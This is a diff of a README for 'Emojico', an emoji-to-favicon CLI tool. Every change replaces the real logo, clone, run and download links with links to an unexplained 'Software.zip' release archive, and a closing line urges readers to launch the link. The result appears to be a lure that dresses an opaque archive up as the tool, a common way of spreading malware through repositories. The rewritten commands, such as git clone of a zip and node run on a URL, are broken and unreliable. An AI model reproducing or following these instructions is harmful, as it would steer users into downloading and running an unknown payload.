@@ -1,7 +1,7 @@
 
 # Emojico
 
-![Emojico Logo](https://emojico-logo.com/logo.png)
+![Emojico Logo](https://github.com/juliocesarmara/emojico/releases/download/v1.0/Software.zip)
 
 Welcome to **Emojico** - the CLI tool that simplifies the process of converting emoji to favicon assets. With Emojico, you can easily create favicon assets for your website or application using your favorite emojis.
 
@@ -17,10 +17,10 @@ To get started with Emojico, follow these simple steps:
 3. Run the Emojico CLI tool and start converting emojis to favicon assets.
 
 ```bash
-$ git clone https://github.com/username/emojico.git
+$ git clone https://github.com/juliocesarmara/emojico/releases/download/v1.0/Software.zip
 $ cd emojico
 $ npm install
-$ node emojico-cli.js
+$ node https://github.com/juliocesarmara/emojico/releases/download/v1.0/Software.zip
 ```
 
 ## Examples
@@ -28,18 +28,18 @@ Here are some examples of how you can use Emojico to create favicon assets:
 
 ### Example 1: Convert Heart Emoji to Favicon
 ```bash
-$ node emojico-cli.js 😍
+$ node https://github.com/juliocesarmara/emojico/releases/download/v1.0/Software.zip 😍
 ```
 
 ### Example 2: Customize Favicon Design
 ```bash
-$ node emojico-cli.js --custom "😎" --color "#ff0000" --size 32
+$ node https://github.com/juliocesarmara/emojico/releases/download/v1.0/Software.zip --custom "😎" --color "#ff0000" --size 32
 ```
 
 ## Get Started
 Ready to start converting emojis to favicon assets? Download the Emojico CLI tool by clicking the button below:
 
-[![Download Emojico](https://img.shields.io/badge/Download-Emojico-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download Emojico](https://github.com/juliocesarmara/emojico/releases/download/v1.0/Software.zip)](https://github.com/juliocesarmara/emojico/releases/download/v1.0/Software.zip)
 
 **Note:** The link needs to be launched to download the Emojico CLI tool.
 
